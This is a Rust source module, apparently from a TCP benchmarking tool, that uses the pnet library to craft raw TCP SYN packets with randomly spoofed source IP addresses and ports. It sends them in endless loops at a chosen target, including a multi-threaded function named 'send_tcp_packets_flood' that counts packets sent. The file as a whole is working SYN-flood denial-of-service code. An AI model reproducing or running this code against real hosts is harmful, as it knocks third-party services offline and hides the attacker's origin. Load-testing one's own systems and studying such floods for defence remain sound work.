

pub mod packet {
    extern crate rand;
    extern crate pnet;
    extern crate pnet_base;
    extern crate pnet_packet;
    extern crate pnet_datalink;
    extern crate pnet_transport;

    use std::sync::atomic::{AtomicUsize,Ordering};
    use crate::bench_tcp::option;
    use std::sync::{Arc, Mutex};
    use std::net::{IpAddr, Ipv4Addr};

    use crate::gen_random::{gen_ipv4, gen_port};
    use crate::time_tools::time_stamp;
    use self::pnet_packet::{
        tcp::*,//{MutableTcpPacket, TcpFlags, TcpOption};
        ethernet::*,//{MutableEthernetPacket, EtherTypes};
        ip::*,//{IpNextHeaderProtocols};
        ipv4::*,//{MutableIpv4Packet, Ipv4Flags};
    };
    
    use self::pnet_datalink::*;//{Channel, NetworkInterface, MacAddr};

    

    pub struct PartialTCPPacketData<'a> {
        pub destination_ip: Ipv4Addr,
        pub iface_ip: Ipv4Addr,
        pub iface_name: &'a String,
        pub iface_src_mac: &'a MacAddr,
    }
    //fn string_to_static_str(s: String) -> &'static str {
    //    Box::leak(s.into_boxed_str())
    //}

    pub fn build_random_packet(partial_packet: &PartialTCPPacketData, tmp_packet: &mut [u8],source_addr:Ipv4Addr,mut src_port:u16,mut dst_port:u16) {
        const ETHERNET_HEADER_LEN: usize = 14;
        const IPV4_HEADER_LEN: usize = 20;
        

        // Setup Ethernet header
        {
            let mut eth_header = MutableEthernetPacket::new(&mut tmp_packet[..ETHERNET_HEADER_LEN]).unwrap();

            eth_header.set_destination(MacAddr::broadcast());
            eth_header.set_source(*partial_packet.iface_src_mac);
            eth_header.set_ethertype(EtherTypes::Ipv4);
        }

        // Setup IP header
        {
            let mut ip_header = MutableIpv4Packet::new(&mut tmp_packet[ETHERNET_HEADER_LEN..(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)]).unwrap();
            ip_header.set_header_length(69);
            ip_header.set_total_length(52);
            ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
            //ip_header.set_source(partial_packet.iface_ip);
            //
            ip_header.set_source(source_addr);
            ip_header.set_destination(partial_packet.destination_ip);
            ip_header.set_identification(rand::random::<u16>());
            ip_header.set_ttl(64);
            ip_header.set_version(4);
            ip_header.set_flags(Ipv4Flags::DontFragment);

            let checksum = pnet_packet::ipv4::checksum(&ip_header.to_immutable());
            ip_header.set_checksum(checksum);
        }
        if src_port==0{
            src_port=rand::random::<u16>();
        }
        if dst_port==0{
            dst_port=rand::random::<u16>();
        }
        // Setup TCP header
        {
            let mut tcp_header = MutableTcpPacket::new(&mut tmp_packet[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..]).unwrap();

            //tcp_header.set_source(rand::random::<u16>());
            //tcp_header.set_source(rand::random::<u16>());
            tcp_header.set_source(src_port);
            //tcp_header.set_destination(rand::random::<u16>());
            tcp_header.set_destination(dst_port);

            tcp_header.set_flags(TcpFlags::SYN);// only set flag SYN
            tcp_header.set_window(64240);
            tcp_header.set_data_offset(8);
            tcp_header.set_urgent_ptr(0);
            tcp_header.set_sequence(0);

            tcp_header.set_options(&[TcpOption::mss(1460), TcpOption::sack_perm(),  TcpOption::nop(), TcpOption::nop(), TcpOption::wscale(7)]);

            //let checksum = pnet_packet::tcp::ipv4_checksum(&tcp_header.to_immutable(), &partial_packet.iface_ip, &partial_packet.destination_ip);
            //tcp_header.set_source(source_port);

            let checksum = pnet_packet::tcp::ipv4_checksum(
                &tcp_header.to_immutable(), 
                //&partial_packet.iface_ip, 
                &source_addr,
                &partial_packet.destination_ip
            );
            

            tcp_header.set_checksum(checksum);
        }
    }

    pub fn send_tcp_packets(destination_ip: Ipv4Addr,dst_port:u16, interface_mac: MacAddr, count: usize) {
        let interfaces = pnet_datalink::interfaces();

        println!("List of Available Interfaces\n");
        
        println!{"{}",destination_ip.to_string()};

        //获取网卡地址
        let mut interface_use=&interfaces[0];
        for interface in interfaces.iter() {
            let iface_ip = interface.ips.iter().next().map(|x| match x.ip() {
                IpAddr::V4(ipv4) => Some(ipv4),
                _ => panic!("ERR - Interface IP is IPv6 (or unknown) which is not currently supported"),
            });
            if interface.mac.unwrap() == interface_mac{
                //interface=
                //let a=interface.name;
                //interface_name=interface.name.clone();
                interface_use=interface;
            };
           
            if iface_ip.unwrap().unwrap()!=Ipv4Addr::new(0, 0, 0, 0){
                println!("Interface name: {:?}\nInterface MAC: {:?}\nInterface IP: {:?}\n", &interface.name, &interface.mac.unwrap(), iface_ip.unwrap().unwrap())
            }
            
        }

        let interface=interface_use;
        println!("interface get");
        let iface_ip = match interface.ips.iter().nth(0).expect(&format!("the interface {} does not have any IP addresses", interface)).ip() {
            IpAddr::V4(ipv4) => ipv4,
            _ => {
                println!("ERR - Interface IP is IPv6 (or unknown) which is not currently supported");
                panic!("ERR - Interface IP is IPv6 (or unknown) which is not currently supported")
            },
        };
        println!("iface_ip get {}",iface_ip.to_string());
        let partial_packet: PartialTCPPacketData = PartialTCPPacketData {
            destination_ip: destination_ip,
            iface_ip,
            iface_name: &interface.name,
            iface_src_mac: &interface.mac.unwrap(),
        };

        let (mut tx, _) = match pnet_datalink::channel(&interface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => {
                println!("Unknown channel type");
                panic!("Unknown channel type")
            },
            Err(e) => {
                println!("Error happened {}", e);
                panic!("Error happened {}", e)
            },
        };
        println!("tx get");

        let mut rng = rand::thread_rng();
        //let mut i:u32=0;
        println!("enter loop");
        loop{
            //PACKETS_SEND.fetch_add(1, Ordering::SeqCst);
            //i+=1;
        
            //println!("send");
            tx.build_and_send(1, 66, &mut |packet: &mut [u8]| {
                build_random_packet(
                    &partial_packet, 
                    packet,
                    gen_ipv4(&mut rng),
                    gen_port(30000, 65535, &mut rng),
                    dst_port
                );
            });

        }
        //println!("Sent {} packet(s)", &count);
    }

    pub fn send_tcp_packets_flood(thread_num:u16,opt:Arc<option::Opt>,_PACKETS_SEND: &AtomicUsize)  -> Result<String,String>{

        let interfaces = pnet_datalink::interfaces();
        println!("List of Available Interfaces\n");
        
        println!{"{}",opt.dst_ip.to_string()};

        //let mut interface_name=String::new();
        let mut interface_get_flag=false;
        let mut interface_use=&interfaces[0];
        for interface in interfaces.iter() {
            let iface_ip = interface.ips.iter().next().map(|x| match x.ip() {
                IpAddr::V4(ipv4) => Some(ipv4),
                _ => panic!("ERR - Interface IP is IPv6 (or unknown) which is not currently supported"),
            });
            if interface.mac.unwrap() == opt.interface_mac{
                //interface=
                //let a=interface.name;
                //interface_name=interface.name.clone();
                interface_use=interface;
                interface_get_flag=true;
            };
           
            if iface_ip.unwrap().unwrap()!=Ipv4Addr::new(0, 0, 0, 0){
                println!("Interface name: {:?}\nInterface MAC: {:?}\nInterface IP: {:?}\n", &interface.name, &interface.mac.unwrap(), iface_ip.unwrap().unwrap())
            }
            
        }
        if !interface_get_flag{
            println!("not found mac");
            return Err(String::from("not found mac"));  
        }
        let interface=interface_use;
        println!("interface get");
        let iface_ip = match interface.ips.iter().nth(0).expect(&format!("the interface {} does not have any IP addresses", interface)).ip() {
            IpAddr::V4(ipv4) => ipv4,
            _ => {
                println!("ERR - Interface IP is IPv6 (or unknown) which is not currently supported");
                panic!("ERR - Interface IP is IPv6 (or unknown) which is not currently supported")
            },
        };
        println!("iface_ip get {}",iface_ip.to_string());
        let partial_packet: PartialTCPPacketData = PartialTCPPacketData {
            destination_ip: opt.dst_ip,
            iface_ip,
            iface_name: &interface.name,
            iface_src_mac: &interface.mac.unwrap(),
        };

        let (mut tx, _) = match pnet_datalink::channel(&interface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => {
                println!("Unknown channel type");
                panic!("Unknown channel type")
            },
            Err(e) => {
                println!("Error happened {}", e);
                panic!("Error happened {}", e)
            },
        };
        //println!("tx get");

        let mut rng = rand::thread_rng();
        //let mut i:u32=0;
        //println!("enter loop");
        println!("thread:{}.sending......",&thread_num);
        loop{
            _PACKETS_SEND.fetch_add(1, Ordering::SeqCst);
            //PACKETS_SEND.fetch_add(1, Ordering::SeqCst);
            //println!("send");
            tx.build_and_send(1, 66, &mut |packet: &mut [u8]| {
                build_random_packet(
                    &partial_packet, 
                    packet,
                    gen_ipv4(&mut rng),
                    gen_port(30000, 65535, &mut rng),
                    opt.dst_port
                );
            });
        }
        //println!("trhread:{},Sent {} packet(s)", &thread_num,&opt.count);
        //return Ok(String::from("not found mac"));  
    }
}
